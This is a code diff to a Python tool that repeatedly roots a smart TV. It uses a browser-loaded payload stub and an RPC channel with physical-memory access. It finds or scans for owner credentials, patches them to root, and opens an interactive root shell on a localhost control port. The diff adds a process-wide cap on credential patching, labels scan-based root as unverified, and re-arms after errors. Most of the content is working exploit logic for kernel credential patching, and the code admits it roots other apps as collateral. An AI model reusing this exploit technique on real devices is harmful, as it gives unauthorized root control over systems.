@@ -13,14 +13,17 @@ What it does per cycle:
   3. root it - tail walk for the `PHYSRPC1` comm first (seconds), else a
      content scan for owner creds (ids `5001,100` x4 at cred+4, bounded to
      phys 0x20000000-0x40000000 because reads past 0x46000000 hang the stub);
-  4. with --shell (default with --once) send op 5 so the server's control channel
-     on 127.0.0.1:9999 becomes an interactive ROOT shell.
+  4. send op 5 (the default; --no-shell skips it) so the server's control
+     channel on 127.0.0.1:9999 becomes an interactive shell.  Only a tail-walk
+     root is claimed as verified; the content scan is labelled unverified
+     because it patches owner creds by CONTENT and cannot prove the stub's own
+     cred was one of them.
 
 The one manual step is opening the TV browser on the page; set it as the
 browser's start page once and the loop takes care of the rest.
 
 Usage:
-  python tools/tv_rootwatch.py --once --shell      # after a boot: root + shell
+  python tools/tv_rootwatch.py --once              # after a boot: root + shell
   python tools/tv_rootwatch.py --interval 15       # loop: keep re-arming
   python tools/tv_rootwatch.py --no-shell          # root only (op 7 stays unused)
 """
@@ -179,23 +182,35 @@ def root_by_tail(rpc):
     return "already" if saw_root else None
 
 
+_SCAN_PATCHED = 0     # process-wide, like the payload's _scanPatched
+
+
 def root_by_cred_scan(rpc, max_patch=8):
     """Content scan for owner creds; list-independent. Returns count patched.
 
     `max_patch` mirrors the payload's process-wide CredScanNear budget: patching
-    every uid-5001 cred on the box roots other apps as collateral, so the
-    fallback is capped instead of unbounded.
+    every uid-5001 cred on the box roots other apps as collateral, so it is a
+    PROCESS-wide cap, not per call - loop mode used to add 8 more foreign owner
+    creds every cycle (review 2026-10-31).
+
+    The iterator is given the remaining budget and drains its readmany batch
+    before stopping, so the next op (op 5) is not written on a socket that still
+    has stale page bytes queued.
     """
+    global _SCAN_PATCHED
+    left = max_patch - _SCAN_PATCHED
+    if left <= 0:
+        log("cred-scan budget already spent this process; tail walk only")
+        return 0
     patched = 0
-    for cred in K.iter_owner_creds(rpc, SCAN_START, SCAN_STOP):
-        if patched >= max_patch:
-            break
+    for cred in K.iter_owner_creds(rpc, SCAN_START, SCAN_STOP, limit=left):
         try:
             usage = T.u32(rpc.read(cred, 4))
         except Exception:
             continue
         if 2 <= usage <= 65536 and K.patch_full(rpc, cred):
             patched += 1
+            _SCAN_PATCHED += 1
     return patched
 
 
@@ -240,13 +255,24 @@ def main():
                 log("tail walk missed; starting cred-content scan (~2 min)")
                 n = root_by_cred_scan(rpc)
                 log(f"cred scan patched {n} cred(s)")
-                state = "rooted" if n else None
+                # A content hit is NOT proof that the stub's own cred was one of
+                # them, so this path is reported as unverified (it used to say
+                # "rooted" and print a ROOT-shell claim - review 2026-10-31).
+                state = "scan" if n else None
             if state:
-                log(f"root: {state}")
+                if state == "scan":
+                    log("cred scan cannot identify the stub's own cred: "
+                        "op5 follows, root must be verified with `id -u`")
+                else:
+                    log(f"root: {state}")
                 if shell_wanted:
                     if send_shell(rpc):
-                        log("op5 sent - 127.0.0.1:9999 is now a ROOT shell "
-                            "(drive it with tools/root_shell.py or recon sh5 attach)")
+                        if state == "scan":
+                            log("op5 sent - 127.0.0.1:9999 is up but UNVERIFIED "
+                                "(content scan); run `id -u` there before trusting it")
+                        else:
+                            log("op5 sent - 127.0.0.1:9999 is now a ROOT shell "
+                                "(drive it with tools/root_shell.py or recon sh5 attach)")
                         if args.once:
                             return 0
                         # loop mode: the stub is consumed by op 5, so keep
@@ -255,6 +281,12 @@ def main():
                     return 0
             else:
                 log("stub found but not rooted (will retry)")
+        except Exception as exc:
+            # One transient RPC error used to kill the watchdog (a traceback out
+            # of the scan/patch verification reads); loop mode must re-arm.
+            log(f"cycle error: {type(exc).__name__}: {exc} (re-arming)")
+            if args.once:
+                return 1
         finally:
             try:
                 rpc.close()
